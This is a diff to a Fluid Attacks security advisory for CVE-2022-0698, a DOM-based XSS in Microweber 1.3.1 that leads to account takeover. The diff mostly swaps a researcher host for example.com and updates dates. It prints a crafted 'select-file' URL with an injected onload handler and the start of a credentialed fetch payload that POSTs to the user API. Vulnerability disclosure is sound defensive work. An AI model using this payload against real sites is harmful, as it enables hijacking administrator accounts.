@@ -5,7 +5,7 @@ authors: Carlos Bello
 writer: cbello
 codename: garrix
 product: Microweber 1.3.1
-date: 2022-09-19 09:00 COT
+date: 2022-11-24 11:00 COT
 cveid: CVE-2022-0698
 severity: 8.8
 description: Microweber 1.3.1  -  DOM XSS to Account Takeover - DOM-Based cross-site scripting (XSS)
@@ -24,7 +24,7 @@ template: advisory
 | **Product**           | Microweber                                             |
 | **Affected versions** | Version 1.3.1                                          |
 | **State**             | Private                                                |
-| **Release date**      | 2022-09-19                                             |
+| **Release date**      | 2022-11-24                                             |
 
 ## Vulnerability
 
@@ -41,23 +41,24 @@ template: advisory
 ## Description
 
 Microweber version 1.3.1 allows an unauthenticated user to perform an
-account takeover via an XSS on the 'select-file' parameter of the
-following URL: http://cbelloatfluid.com/admin/view:modules/load_module:files#select-file=http://cbelloatfluid.com/userfiles/media/default/ovaa-checklist.txt.
-It is possible to obtain administrative accounts through a malicious link.
+account takeover via an XSS on the 'select-file' parameter. The following
+is an example of a vulnerable URL:
+
+* http://example.com/admin/view:modules/load_module:files#select-file=http://example.com/userfiles/media/default/ovaa-checklist.txt.
 
 ## Vulnerability
 
 The XSS present in Microweber 1.3.1, allows an unauthenticated remote
 attacker to perform an Account Takeover. To trigger this vulnerability,
 we will need to send the following malicious link to an administrator in
-order to hack their account:
+order to hack their account. The following is an example of a malicious URL:
 
-* http://cbelloatfluid.com/admin/view:modules/load_module:files#select-file=http://cbelloatfluid.com/userfiles/media/default/ovaa-checklist.php%22onload%3d%22javascript:PAYLOAD%22+///.txt
+* http://example.com/admin/view:modules/load_module:files#select-file=http://example.com/userfiles/media/default/ovaa-checklist.php%22onload%3d%22javascript:PAYLOAD%22+///.txt
 
-In the PAYLOAD field we will put the following malicious JS code:
+In the **PAYLOAD** field we will put the following malicious JS code:
 
 ```js
-fetch('http://cbelloatfluid.com/api/user/1',{
+fetch('http://example.com/api/user/1',{
     method:'POST',
     credentials:'include',
     headers:{
@@ -120,5 +121,5 @@ Team of `Fluid Attacks`.
   replied="2022-09-19"
   confirmed="2022-09-19"
   patched="2022-09-19"
-  disclosure="2022-09-19">
+  disclosure="2022-11-24">
 </time-lapse>
